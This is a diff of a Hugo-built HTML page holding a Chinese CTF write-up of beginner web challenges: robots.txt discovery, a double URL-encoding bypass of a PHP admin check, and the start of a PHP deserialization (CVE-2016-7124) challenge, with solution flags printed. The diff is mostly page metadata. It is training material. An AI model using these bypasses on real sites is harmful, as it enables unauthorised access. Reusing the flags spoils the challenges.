@@ -1,277 +1,1469 @@
-<!doctype html><html lang=zh dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='一、低难度#1.1 Training-WWW-Robots（Robots）#考察Robots协议，这是一个爬虫的君子协议，规定哪些网站可以访问，哪些不可以访问，该文件一般放在网站的根目录下(/robots.txt) 题目还讲述，这些文件也揭示了目录结构 直接URL拼接/robots.txt，获得如下信息：
-1User-agent: * 2Disallow: /fl0g.php 3 4User-agent: Yandex 5Disallow: *URL再拼接/robots.txt，获得flagcyberpeace{40f29ee385120426536014952e9cb9f3}
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="一、低难度#1.1 Training-WWW-Robots（Robots）#考察Robots协议，这是一个爬虫的君子协议，规定哪些网站可以访问，哪些不可以访问，该文件一般放在网站的根目录下(/robots.txt) 题目还讲述，这些文件也揭示了目录结构 直接URL拼接/robots.txt，获得如下信息：
+User-agent: *Disallow: /fl0g.phpUser-agent: YandexDisallow: *URL再拼接/robots.txt，获得flagcyberpeace{40f29ee385120426536014952e9cb9f3}
 1.2 PHP2（index.phps）#URL拼接index.phps后缀来查看php源代码
-1<?php 2if("admin"===$_GET[id]) { 3 echo("<p>not allowed!</p>"); 4 exit(); 5} 6 7$_GET[id] = urldecode($_GET[id]); 8if($_GET[id] == "admin") 9{ 10 echo "<p>Access granted!</p>"; 11 echo "<p>Key: xxxxxxx </p>"; 12} 13?> 14 15Can you anthenticate to this website? 如果id用get方法直接传入admin，则会直接退出，将get传入的id进行解码后，如果id=admin，则会输出key 这里采用burpsuite的编码器直接对admin进行url解码，admin → %61%64%6d%69%6e URL后缀加入/?id=%61%64%6d%69%6e，但拒绝访问，因为url后缀自动变成admin，因此二次url解码，→ %25%36%31%25%36%34%25%36%64%25%36%39%25%36%65 成功获得flagcyberpeace{6493a95c8814ca178d91560aed4993d2}
-'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/ctf/easy/ctf-web-low/"><meta property="og:site_name" content="vnccer"><meta property="og:title" content="web-low"><meta property="og:description" content='一、低难度#1.1 Training-WWW-Robots（Robots）#考察Robots协议，这是一个爬虫的君子协议，规定哪些网站可以访问，哪些不可以访问，该文件一般放在网站的根目录下(/robots.txt) 题目还讲述，这些文件也揭示了目录结构 直接URL拼接/robots.txt，获得如下信息：
-1User-agent: * 2Disallow: /fl0g.php 3 4User-agent: Yandex 5Disallow: *URL再拼接/robots.txt，获得flagcyberpeace{40f29ee385120426536014952e9cb9f3}
+&lt;?php if(&#34;admin&#34;===$_GET[id]) { echo(&#34;&lt;p&gt;not allowed!&lt;/p&gt;&#34;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &#34;admin&#34;) { echo &#34;&lt;p&gt;Access granted!&lt;/p&gt;&#34;; echo &#34;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&#34;; } ?&gt; Can you anthenticate to this website? 如果id用get方法直接传入admin，则会直接退出，将get传入的id进行解码后，如果id=admin，则会输出key 这里采用burpsuite的编码器直接对admin进行url解码，admin → %61%64%6d%69%6e URL后缀加入/?id=%61%64%6d%69%6e，但拒绝访问，因为url后缀自动变成admin，因此二次url解码，→ %25%36%31%25%36%34%25%36%64%25%36%39%25%36%65 成功获得flagcyberpeace{6493a95c8814ca178d91560aed4993d2}
+1.3 unserialize3（反序列化漏洞）#class xctf{ public $flag = &#39;111&#39;; public function __wakeup(){ exit(&#39;bad requests&#39;); } ?code=PHP反序列化漏洞场景(CVE-2016-7124)，分析
+$flag = &#39;111&#39;;是类中的一个属性 function __wakeup()是魔术方法，unserialize()反序列化函数会检查是否存在__wakeup方法，如果存在，则会先调用__wakeup方法 exit(&#39;bad requests&#39;);这里的__wakeup起到了防御作用，一旦尝试反序列化这个类，它会直接终止程序，防止后续代码执行 目前的代码无序列化函数(即：serialize()函数，能将内存中的对象转为文本，触发魔术方法：__sleep()如果存在)，所以传递参数的时候需要自己传递已经序列化的参数，题目提示，传参给code 打开phpstudy，安装php5.4.45nts，localhost网站选择这个php版本，接着在/WWW目录下创建serialize.php文件，内容如下：
+&lt;?php class xctf{ public $flag = &#39;111&#39;; public function __wakeup(){ exit(&#39;bad requests&#39;); } } $x = new xctf(); // 创建新对象（实例化） echo(serialize($x)); // 对对象序列化输出 ?&gt; $x是变量名指向内存中刚刚创建出来的哪个对象 而new是关键字，告诉php引擎去内存开启一片空间用于创建一个新的对象实例 xctf()是类名，告诉new用xctf这张图纸来创建对象，括号()代表调用该类的构造函数 因此$x = new xctf();产生了一个包含$flag = &#39;111&#39;数据的对象实体，serialize($x)才能把这个实体转成字符串0:4:&#34;xctf&#34;:1:{...}
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/CTF/easy/CTF-web-low/">
+  <meta property="og:site_name" content="vnccer">
+  <meta property="og:title" content="web-low">
+  <meta property="og:description" content="一、低难度#1.1 Training-WWW-Robots（Robots）#考察Robots协议，这是一个爬虫的君子协议，规定哪些网站可以访问，哪些不可以访问，该文件一般放在网站的根目录下(/robots.txt) 题目还讲述，这些文件也揭示了目录结构 直接URL拼接/robots.txt，获得如下信息：
+User-agent: *Disallow: /fl0g.phpUser-agent: YandexDisallow: *URL再拼接/robots.txt，获得flagcyberpeace{40f29ee385120426536014952e9cb9f3}
 1.2 PHP2（index.phps）#URL拼接index.phps后缀来查看php源代码
-1<?php 2if("admin"===$_GET[id]) { 3 echo("<p>not allowed!</p>"); 4 exit(); 5} 6 7$_GET[id] = urldecode($_GET[id]); 8if($_GET[id] == "admin") 9{ 10 echo "<p>Access granted!</p>"; 11 echo "<p>Key: xxxxxxx </p>"; 12} 13?> 14 15Can you anthenticate to this website? 如果id用get方法直接传入admin，则会直接退出，将get传入的id进行解码后，如果id=admin，则会输出key 这里采用burpsuite的编码器直接对admin进行url解码，admin → %61%64%6d%69%6e URL后缀加入/?id=%61%64%6d%69%6e，但拒绝访问，因为url后缀自动变成admin，因此二次url解码，→ %25%36%31%25%36%34%25%36%64%25%36%39%25%36%65 成功获得flagcyberpeace{6493a95c8814ca178d91560aed4993d2}'><meta property="og:locale" content="zh"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:modified_time" content="2026-03-12T15:58:07+08:00"><meta itemprop=name content="web-low"><meta itemprop=description content='一、低难度#1.1 Training-WWW-Robots（Robots）#考察Robots协议，这是一个爬虫的君子协议，规定哪些网站可以访问，哪些不可以访问，该文件一般放在网站的根目录下(/robots.txt) 题目还讲述，这些文件也揭示了目录结构 直接URL拼接/robots.txt，获得如下信息：
-1User-agent: * 2Disallow: /fl0g.php 3 4User-agent: Yandex 5Disallow: *URL再拼接/robots.txt，获得flagcyberpeace{40f29ee385120426536014952e9cb9f3}
+&lt;?php if(&#34;admin&#34;===$_GET[id]) { echo(&#34;&lt;p&gt;not allowed!&lt;/p&gt;&#34;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &#34;admin&#34;) { echo &#34;&lt;p&gt;Access granted!&lt;/p&gt;&#34;; echo &#34;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&#34;; } ?&gt; Can you anthenticate to this website? 如果id用get方法直接传入admin，则会直接退出，将get传入的id进行解码后，如果id=admin，则会输出key 这里采用burpsuite的编码器直接对admin进行url解码，admin → %61%64%6d%69%6e URL后缀加入/?id=%61%64%6d%69%6e，但拒绝访问，因为url后缀自动变成admin，因此二次url解码，→ %25%36%31%25%36%34%25%36%64%25%36%39%25%36%65 成功获得flagcyberpeace{6493a95c8814ca178d91560aed4993d2}
+1.3 unserialize3（反序列化漏洞）#class xctf{ public $flag = &#39;111&#39;; public function __wakeup(){ exit(&#39;bad requests&#39;); } ?code=PHP反序列化漏洞场景(CVE-2016-7124)，分析
+$flag = &#39;111&#39;;是类中的一个属性 function __wakeup()是魔术方法，unserialize()反序列化函数会检查是否存在__wakeup方法，如果存在，则会先调用__wakeup方法 exit(&#39;bad requests&#39;);这里的__wakeup起到了防御作用，一旦尝试反序列化这个类，它会直接终止程序，防止后续代码执行 目前的代码无序列化函数(即：serialize()函数，能将内存中的对象转为文本，触发魔术方法：__sleep()如果存在)，所以传递参数的时候需要自己传递已经序列化的参数，题目提示，传参给code 打开phpstudy，安装php5.4.45nts，localhost网站选择这个php版本，接着在/WWW目录下创建serialize.php文件，内容如下：
+&lt;?php class xctf{ public $flag = &#39;111&#39;; public function __wakeup(){ exit(&#39;bad requests&#39;); } } $x = new xctf(); // 创建新对象（实例化） echo(serialize($x)); // 对对象序列化输出 ?&gt; $x是变量名指向内存中刚刚创建出来的哪个对象 而new是关键字，告诉php引擎去内存开启一片空间用于创建一个新的对象实例 xctf()是类名，告诉new用xctf这张图纸来创建对象，括号()代表调用该类的构造函数 因此$x = new xctf();产生了一个包含$flag = &#39;111&#39;数据的对象实体，serialize($x)才能把这个实体转成字符串0:4:&#34;xctf&#34;:1:{...}">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+    <meta property="article:modified_time" content="2026-03-12T15:58:07+08:00">
+
+
+  <meta itemprop="name" content="web-low">
+  <meta itemprop="description" content="一、低难度#1.1 Training-WWW-Robots（Robots）#考察Robots协议，这是一个爬虫的君子协议，规定哪些网站可以访问，哪些不可以访问，该文件一般放在网站的根目录下(/robots.txt) 题目还讲述，这些文件也揭示了目录结构 直接URL拼接/robots.txt，获得如下信息：
+User-agent: *Disallow: /fl0g.phpUser-agent: YandexDisallow: *URL再拼接/robots.txt，获得flagcyberpeace{40f29ee385120426536014952e9cb9f3}
 1.2 PHP2（index.phps）#URL拼接index.phps后缀来查看php源代码
-1<?php 2if("admin"===$_GET[id]) { 3 echo("<p>not allowed!</p>"); 4 exit(); 5} 6 7$_GET[id] = urldecode($_GET[id]); 8if($_GET[id] == "admin") 9{ 10 echo "<p>Access granted!</p>"; 11 echo "<p>Key: xxxxxxx </p>"; 12} 13?> 14 15Can you anthenticate to this website? 如果id用get方法直接传入admin，则会直接退出，将get传入的id进行解码后，如果id=admin，则会输出key 这里采用burpsuite的编码器直接对admin进行url解码，admin → %61%64%6d%69%6e URL后缀加入/?id=%61%64%6d%69%6e，但拒绝访问，因为url后缀自动变成admin，因此二次url解码，→ %25%36%31%25%36%34%25%36%64%25%36%39%25%36%65 成功获得flagcyberpeace{6493a95c8814ca178d91560aed4993d2}'><meta itemprop=dateModified content="2026-03-12T15:58:07+08:00"><meta itemprop=wordCount content="724"><title>web-low | vnccer</title><link rel=icon href=/AK47.png><link rel=manifest href=/manifest.json><link rel=canonical href=http://localhost:1313/docs/cybersecurity/ctf/easy/ctf-web-low/><link rel=stylesheet href=/book.min.326841005b40561605b2115d01f6c968310c7418136629028362d36e053c379d.css integrity="sha256-MmhBAFtAVhYFshFdAfbJaDEMdBgTZikCg2LTbgU8N50=" crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css><script defer src=/fuse.min.js></script><script defer src=/zh.search.min.66c1db10d16485077a36978ecae911247f7957b6d1fac2f37e4d0f3122855ee3.js integrity="sha256-ZsHbENFkhQd6NpeOyukRJH95V7bR+sLzfk0PMSKFXuM=" crossorigin=anonymous></script><script>(function(){localStorage.getItem("sidebar-collapsed")==="true"&&document.documentElement.classList.add("sidebar-collapsed-init")})()</script></head><body dir=ltr class="book-kind-page book-type-docs"><input type=checkbox class="hidden toggle" id=menu-control>
-<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/flamez.png alt=Logo><span>vnccer</span></a></h2><div class="book-search hidden"><input id=book-search-input type=text placeholder=搜索 aria-label=搜索 maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><a href=/docs/>🏠 返回主页</a></li></ul><button class=sidebar-toggle onclick=toggleSidebar() aria-label="Toggle Sidebar">
-<i class="fas fa-angle-left"></i></button><ul><li><input type=checkbox id=section-4812594788d2c7059bd80232c02af0d6 class=toggle checked>
-<label for=section-4812594788d2c7059bd80232c02af0d6 class=flex><a href=/docs/cybersecurity/><span style=display:inline-flex;align-items:center;gap:8px><span>🛡️</span><span>网安</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-4b8026b2ef91fed29957b6dd552f3cd1 class=toggle>
-<label for=section-4b8026b2ef91fed29957b6dd552f3cd1 class=flex><a href=/docs/cybersecurity/dvwa/><span style=display:inline-flex;align-items:center;gap:8px><span>DVWA</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/dvwa/dvwa/><span style=display:inline-flex;align-items:center;gap:8px><span>DVWA全难度</span></span></a></li></ul></li><li><input type=checkbox id=section-33d66818bfeced9ba6f59416de59c638 class=toggle>
-<label for=section-33d66818bfeced9ba6f59416de59c638 class=flex><a href=/docs/cybersecurity/vulnerabilities/><span style=display:inline-flex;align-items:center;gap:8px><span>vulnerabilities</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnerabilities/apache-log4j2cve-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/><span style=display:inline-flex;align-items:center;gap:8px><span>基于docker的log4j2（CVE-2021-44228）漏洞（失败）</span></span></a></li></ul></li><li><input type=checkbox id=section-1061c6c3a619113d31feeef8b55aa0af class=toggle>
-<label for=section-1061c6c3a619113d31feeef8b55aa0af class=flex><a href=/docs/cybersecurity/vulnhub/><span style=display:inline-flex;align-items:center;gap:8px><span>VULNHUB</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-d6fb052e486182e9d950efd6bdcd7544 class=toggle>
-<label for=section-d6fb052e486182e9d950efd6bdcd7544 class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>easy</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-beelzebub_1/><span style=display:inline-flex;align-items:center;gap:8px><span>Beelzebub: 1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-empire_breakout/><span style=display:inline-flex;align-items:center;gap:8px><span>Empire Breakout</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-ica_1/><span style=display:inline-flex;align-items:center;gap:8px><span>ICA: 1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-jangow_1.0.1/><span style=display:inline-flex;align-items:center;gap:8px><span>jangow 1.0.1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-napping-1.0.1/><span style=display:inline-flex;align-items:center;gap:8px><span>Napping: 1.0.1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-noob_1/><span style=display:inline-flex;align-items:center;gap:8px><span>Noob: 1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-the-planets_earth/><span style=display:inline-flex;align-items:center;gap:8px><span>The planets earth</span></span></a></li></ul></li><li><input type=checkbox id=section-217a33c9ab6cb7480b66e6fc3c901104 class=toggle>
-<label for=section-217a33c9ab6cb7480b66e6fc3c901104 class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>medium</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/medium/vulnhub-empire_lupinone/><span style=display:inline-flex;align-items:center;gap:8px><span>Empire lupinone</span></span></a></li></ul></li><li><input type=checkbox id=section-90b87787f24b7d37429e1cd5b0528c96 class=toggle>
-<label for=section-90b87787f24b7d37429e1cd5b0528c96 class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>hard</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li></ul></li><li><input type=checkbox id=section-e39c1a654e59f621dd1360f7f30a45b5 class=toggle checked>
-<label for=section-e39c1a654e59f621dd1360f7f30a45b5 class=flex><a href=/docs/cybersecurity/ctf/><span style=display:inline-flex;align-items:center;gap:8px><span>CTF</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-0487c019683c53bd5946a574af947fcd class=toggle checked>
-<label for=section-0487c019683c53bd5946a574af947fcd class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>easy</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/ctf/easy/ctf-web-low/ class=active><span style=display:inline-flex;align-items:center;gap:8px><span>web-low</span></span></a></li></ul></li><li><input type=checkbox id=section-449a2c3b61b7512315c644ea5feb5715 class=toggle>
-<label for=section-449a2c3b61b7512315c644ea5feb5715 class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>medium</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li><li><input type=checkbox id=section-011df73066cb46bd9a3b70d7ab49a0ab class=toggle>
-<label for=section-011df73066cb46bd9a3b70d7ab49a0ab class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>hard</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li></ul></li></ul></li><li><input type=checkbox id=section-7aec202ce54c41749fd44d4107024bd0 class=toggle>
-<label for=section-7aec202ce54c41749fd44d4107024bd0 class=flex><a href=/docs/papers/><span style=display:inline-flex;align-items:center;gap:8px><span>📄</span><span>论文</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-0b5f6bcc8205d8c69a48df615a80be2c class=toggle>
-<label for=section-0b5f6bcc8205d8c69a48df615a80be2c class=flex><a href=/docs/papers/et-bert/et-bert/><span style=display:inline-flex;align-items:center;gap:8px><span>ET-BERT</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label></li><li><input type=checkbox id=section-ff28b038514d9b4fa29796997b003b8a class=toggle>
-<label for=section-ff28b038514d9b4fa29796997b003b8a class=flex><a href=/docs/papers/et-bert/et-bert%E5%A4%8D%E7%8E%B0/><span style=display:inline-flex;align-items:center;gap:8px><span>ET-BERT复现</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label></li></ul></li><li><input type=checkbox id=section-601151e093f781f3949570b4dccefe4b class=toggle>
-<label for=section-601151e093f781f3949570b4dccefe4b class=flex><a href=/docs/work/><span style=display:inline-flex;align-items:center;gap:8px><span>💼</span><span>未来</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/work/n/><span style=display:inline-flex;align-items:center;gap:8px><span>N</span></span></a></li></ul></li><li><input type=checkbox id=section-114786bd93b83846332283540536c052 class=toggle>
-<label for=section-114786bd93b83846332283540536c052 class=flex><a href=/docs/ai/><span style=display:inline-flex;align-items:center;gap:8px><span>🤖</span><span>AI</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li><li><input type=checkbox id=section-1b825241e23f5ffe0a3e34d4481bfcee class=toggle>
-<label for=section-1b825241e23f5ffe0a3e34d4481bfcee class=flex><a href=/docs/skills/><span style=display:inline-flex;align-items:center;gap:8px><span>🛠️</span><span>技能</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/><span style=display:inline-flex;align-items:center;gap:8px><span>anaconda环境配置</span></span></a></li><li><a href=/docs/skills/kali-linux/><span style=display:inline-flex;align-items:center;gap:8px><span>kali linux基础</span></span></a></li><li><a href=/docs/skills/switchyomega-mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/><span style=display:inline-flex;align-items:center;gap:8px><span>SwitchyOmega mv3操作记录</span></span></a></li><li><a href=/docs/skills/win-+-r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/><span style=display:inline-flex;align-items:center;gap:8px><span>win + r常用指令</span></span></a></li><li><a href=/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali-linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/><span style=display:inline-flex;align-items:center;gap:8px><span>基于vmware的kali linux下的docker部署(坑多)</span></span></a></li><li><a href=/docs/skills/%E7%BD%91%E7%AB%99%E6%9E%84%E5%BB%BA/><span style=display:inline-flex;align-items:center;gap:8px><span>网站构建</span></span></a></li></ul></li><li><input type=checkbox id=section-f61a54d247f538b8e499d8d6a63dd0af class=toggle>
-<label for=section-f61a54d247f538b8e499d8d6a63dd0af class=flex><a href=/docs/life/><span style=display:inline-flex;align-items:center;gap:8px><span>☕</span><span>生活</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li><li><input type=checkbox id=section-5fcfcafd77cf38869672166f51c04c8e class=toggle>
-<label for=section-5fcfcafd77cf38869672166f51c04c8e class=flex><a href=/docs/navigator/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-compass" style=width:1.25em;text-align:center></i><span>网站导航</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/navigator/n_cyber-range/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-bolt-lightning" style=width:1.25em;text-align:center></i><span>打靶</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_papers/><span style=display:inline-flex;align-items:center;gap:8px><span>📃</span><span>论文</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_work/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-briefcase" style=width:1.25em;text-align:center></i><span>工作</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_ai/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-robot" style=width:1.25em;text-align:center></i><span>AI</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_function/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-gears" style=width:1.25em;text-align:center></i><span>Function</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_life/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-gamepad" style=width:1.25em;text-align:center></i><span>Life</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_forum/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-hippo" style=width:1.25em;text-align:center></i><span>平台</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_airport/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-plane" style=width:1.25em;text-align:center></i><span>机场</span></span></a><ul></ul></li></ul></li></ul><button class=sidebar-toggle onclick=toggleSidebar() aria-label="Toggle Sidebar">
-<i class="fas fa-angle-left"></i></button></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class="book-header hidden"><div class="flex align-center justify-between"><label for=menu-control><img src=/icons/menu.svg class=book-icon alt=Menu></label><h3>web-low</h3><label for=toc-control><img src=/icons/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class=hidden><nav id=TableOfContents><ul><li><a href=#一低难度>一、低难度</a><ul><li><a href=#11-training-www-robotsrobots>1.1 Training-WWW-Robots（Robots）</a></li><li><a href=#12-php2indexphps>1.2 PHP2（index.phps）</a></li><li><a href=#13-unserialize3反序列化漏洞>1.3 unserialize3（反序列化漏洞）</a></li><li><a href=#14-ics-06字典爆破>1.4 ics-06（字典爆破）</a></li><li><a href=#15-get_postgetpost>1.5 get_post（GET/POST）</a></li><li><a href=#16-backup目录扫描>1.6 backup（目录扫描）</a></li><li><a href=#17-cookie>1.7 cookie</a></li><li><a href=#18-disabled_buttonhtml源码修改>1.8 disabled_button（HTML源码修改）</a></li><li><a href=#19-weak_auth字典爆破>1.9 weak_auth（字典爆破）</a></li><li><a href=#110-simple_phpphp源码审计>1.10 simple_php（php源码审计）</a></li><li><a href=#111-baby_web重定向>1.11 baby_web(重定向)</a></li><li><a href=#112-ingetsql注入>1.12 inget(sql注入)</a></li><li><a href=#113-easyupload文件上传>1.13 easyupload(文件上传)</a><ul><li><a href=#1131-一般思路>1.13.1 一般思路</a></li><li><a href=#1132-userini思路>1.13.2 <code>.user.ini</code>思路</a></li></ul></li><li><a href=#114-file-include文件包含伪协议>1.14 file include(文件包含伪协议)</a><ul><li><a href=#1141-源码分析>1.14.1 源码分析</a></li><li><a href=#1142-php的filter伪协议>1.14.2 PHP的<code>filter</code>伪协议</a></li></ul></li><li><a href=#115-fileclude文件包含伪协议>1.15 fileclude(文件包含伪协议)</a></li><li><a href=#116-easyphp>1.16 easyphp</a></li><li><a href=#117-file_includephp本地包含lfi漏洞>1.17 file_include（php本地包含LFI漏洞）</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=一低难度>一、低难度<a class=anchor href=#%e4%b8%80%e4%bd%8e%e9%9a%be%e5%ba%a6>#</a></h1><h2 id=11-training-www-robotsrobots>1.1 Training-WWW-Robots（Robots）<a class=anchor href=#11-training-www-robotsrobots>#</a></h2><p>考察Robots协议，这是一个爬虫的君子协议，规定哪些网站可以访问，哪些不可以访问，该文件一般放在网站的根目录下(<code>/robots.txt</code>)
+&lt;?php if(&#34;admin&#34;===$_GET[id]) { echo(&#34;&lt;p&gt;not allowed!&lt;/p&gt;&#34;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &#34;admin&#34;) { echo &#34;&lt;p&gt;Access granted!&lt;/p&gt;&#34;; echo &#34;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&#34;; } ?&gt; Can you anthenticate to this website? 如果id用get方法直接传入admin，则会直接退出，将get传入的id进行解码后，如果id=admin，则会输出key 这里采用burpsuite的编码器直接对admin进行url解码，admin → %61%64%6d%69%6e URL后缀加入/?id=%61%64%6d%69%6e，但拒绝访问，因为url后缀自动变成admin，因此二次url解码，→ %25%36%31%25%36%34%25%36%64%25%36%39%25%36%65 成功获得flagcyberpeace{6493a95c8814ca178d91560aed4993d2}
+1.3 unserialize3（反序列化漏洞）#class xctf{ public $flag = &#39;111&#39;; public function __wakeup(){ exit(&#39;bad requests&#39;); } ?code=PHP反序列化漏洞场景(CVE-2016-7124)，分析
+$flag = &#39;111&#39;;是类中的一个属性 function __wakeup()是魔术方法，unserialize()反序列化函数会检查是否存在__wakeup方法，如果存在，则会先调用__wakeup方法 exit(&#39;bad requests&#39;);这里的__wakeup起到了防御作用，一旦尝试反序列化这个类，它会直接终止程序，防止后续代码执行 目前的代码无序列化函数(即：serialize()函数，能将内存中的对象转为文本，触发魔术方法：__sleep()如果存在)，所以传递参数的时候需要自己传递已经序列化的参数，题目提示，传参给code 打开phpstudy，安装php5.4.45nts，localhost网站选择这个php版本，接着在/WWW目录下创建serialize.php文件，内容如下：
+&lt;?php class xctf{ public $flag = &#39;111&#39;; public function __wakeup(){ exit(&#39;bad requests&#39;); } } $x = new xctf(); // 创建新对象（实例化） echo(serialize($x)); // 对对象序列化输出 ?&gt; $x是变量名指向内存中刚刚创建出来的哪个对象 而new是关键字，告诉php引擎去内存开启一片空间用于创建一个新的对象实例 xctf()是类名，告诉new用xctf这张图纸来创建对象，括号()代表调用该类的构造函数 因此$x = new xctf();产生了一个包含$flag = &#39;111&#39;数据的对象实体，serialize($x)才能把这个实体转成字符串0:4:&#34;xctf&#34;:1:{...}">
+  <meta itemprop="dateModified" content="2026-03-12T15:58:07+08:00">
+  <meta itemprop="wordCount" content="655">
+
+<title>web-low | vnccer</title>
+<link rel="icon" href="/ak47.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/cybersecurity/CTF/easy/CTF-web-low/">
+<link rel="stylesheet" href="/book.min.736951ca3ba5472b01b559ccf11c0bd72daa52528001c9a2789c1ea4a2c2c765.css" integrity="sha256-c2lRyjulRysBtVnM8RwL1y2qUlKAAcmieJwepKLCx2U=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.dbfdb659412a555a77ef5b04999942f4b716ee27fac91f83a3f7534110ecff57.js" integrity="sha256-2/22WUEqVVp371sEmZlC9LcW7if6yR&#43;Do/dTQRDs/1c=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
